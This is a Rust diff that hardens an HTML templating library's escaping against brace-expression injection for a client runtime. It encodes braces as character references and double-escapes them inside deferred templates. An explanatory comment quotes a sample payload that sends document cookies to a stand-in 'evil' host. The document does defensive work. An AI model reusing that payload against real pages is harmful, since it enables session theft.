@@ -247,16 +247,16 @@ render_via_display!(
 /// trait rather than overloading `Render`.
 ///
 /// ```ignore
-/// html! {
+/// html! {r##"
 ///     <section>
-///         <p>"Logged in as "@{user.name}</p>
+///         <p>Logged in as @{user.name}</p>
 ///         <script>
 ///             const [count, setCount] = pp.state(@{42});
 ///             const [name, setName] = pp.state(@{"Ada"});
 ///             const user = @{Json(&user)};
 ///         </script>
 ///     </section>
-/// }
+/// "##}
 /// ```
 ///
 /// Primitives write themselves through `Display` — a number is `42`, a flag
@@ -337,12 +337,12 @@ render_js_via_display!(
 /// ```ignore
 /// let user = User { name: "Ada", admin: true };
 /// let rows: Vec<Row> = query().await?;
-/// html! {
+/// html! {r##"
 ///     <script>
 ///         const user = @{Json(&user)};
 ///         const rows = @{Json(&rows)};
 ///     </script>
-/// }
+/// "##}
 /// ```
 ///
 /// `serde_json` spells booleans, `null`, numbers, strings and the rest the way
@@ -383,6 +383,17 @@ fn neutralise_script_breakouts(json: &str) -> String {
     json.replace('<', "\\u003c")
 }
 
+// A value's braces are written as character references, in text and in
+// attributes alike. PulsePoint compiles the rendered page: a `{…}` whose body
+// parses as JavaScript is an expression it evaluates, and braces are not
+// HTML-special, so a stored `{fetch('//evil/' + document.cookie)}` would pass
+// HTML escaping untouched and run in the browser. `&#123;` shows a brace
+// wherever the browser renders it, and inside the root layout's deferred
+// `<template pp-component>` it is raised one more layer (see
+// [`render_deferred_children`]) so the runtime reads a reference rather than
+// the start of an expression. `Html::from_raw` is the trust boundary: markup
+// built through it keeps its braces live.
+
 fn escape_text_into(text: &str, out: &mut String) {
     out.reserve(text.len());
     for c in text.chars() {
@@ -390,12 +401,24 @@ fn escape_text_into(text: &str, out: &mut String) {
             '&' => out.push_str("&amp;"),
             '<' => out.push_str("&lt;"),
             '>' => out.push_str("&gt;"),
+            '{' => out.push_str("&#123;"),
+            '}' => out.push_str("&#125;"),
             c => out.push(c),
         }
     }
 }
 
 pub(crate) fn escape_attr_into(text: &str, out: &mut String) {
+    escape_attr_with(text, out, true);
+}
+
+/// The attribute rules for client source an author wrote — a `{…}` binding
+/// `html!` hands down — whose braces are the expression and stay live.
+pub(crate) fn escape_source_attr_into(text: &str, out: &mut String) {
+    escape_attr_with(text, out, false);
+}
+
+fn escape_attr_with(text: &str, out: &mut String, braces: bool) {
     out.reserve(text.len());
     for c in text.chars() {
         match c {
@@ -404,7 +427,76 @@ pub(crate) fn escape_attr_into(text: &str, out: &mut String) {
             '>' => out.push_str("&gt;"),
             '"' => out.push_str("&quot;"),
             '\'' => out.push_str("&#39;"),
+            '{' if braces => out.push_str("&#123;"),
+            '}' if braces => out.push_str("&#125;"),
             c => out.push(c),
         }
     }
+}
+
+/// The brace references the client runtime recognises, matched without
+/// regard to case. `html!` sends an authored one already doubled; these are
+/// the single-layer forms a value, or `Html::from_raw` markup, carries.
+const BRACE_REFERENCES: [&str; 6] = [
+    "&#123;", "&#125;", "&#x7b;", "&#x7d;", "&lbrace;", "&rbrace;",
+];
+
+/// Write a root layout's children into the deferred `<template
+/// pp-component>` that `html!` wraps around its `<slot />`.
+///
+/// The browser decodes one layer of character references while it parses
+/// the response, so a value's `&#123;` would reach the runtime as a bare `{`
+/// and be compiled as an expression. Every single-layer brace reference is
+/// written as `&amp;#123;` instead: the parse leaves `&#123;` standing, and
+/// the runtime renders a literal brace. A reference that is already doubled
+/// has no `&#` to match and passes through, as does everything inside
+/// `<script>` and `<style>`, whose bodies the browser never decodes.
+#[doc(hidden)]
+pub fn render_deferred_children(children: &Html, out: &mut String) {
+    let html = children.as_str();
+    out.reserve(html.len() + 32);
+    let mut rest = html;
+    while let Some(at) = rest.find(['&', '<']) {
+        out.push_str(&rest[..at]);
+        let tail = &rest[at..];
+        let taken = if tail.starts_with('<') {
+            let end = raw_text_element_len(tail).unwrap_or(1);
+            out.push_str(&tail[..end]);
+            end
+        } else if let Some(reference) = BRACE_REFERENCES.iter().find(|reference| {
+            tail.get(..reference.len())
+                .is_some_and(|head| head.eq_ignore_ascii_case(reference))
+        }) {
+            out.push_str("&amp;");
+            out.push_str(&tail[1..reference.len()]);
+            reference.len()
+        } else {
+            out.push('&');
+            1
+        };
+        rest = &tail[taken..];
+    }
+    out.push_str(rest);
+}
+
+/// The length of the `<script>…</script>` or `<style>…</style>` element that
+/// `tail` opens, through its end tag — or the rest of the input when the end
+/// tag is missing. `None` when `tail` opens anything else.
+fn raw_text_element_len(tail: &str) -> Option<usize> {
+    let name = ["script", "style"].into_iter().find(|name| {
+        let after = 1 + name.len();
+        tail.get(1..after)
+            .is_some_and(|tag| tag.eq_ignore_ascii_case(name))
+            && tail[after..].starts_with(|c: char| c.is_ascii_whitespace() || c == '>' || c == '/')
+    })?;
+    let lower = tail.to_ascii_lowercase();
+    let close = format!("</{name}");
+    let Some(close_at) = lower[1..].find(&close).map(|at| at + 1) else {
+        return Some(tail.len());
+    };
+    Some(
+        lower[close_at..]
+            .find('>')
+            .map_or(tail.len(), |end| close_at + end + 1),
+    )
 }
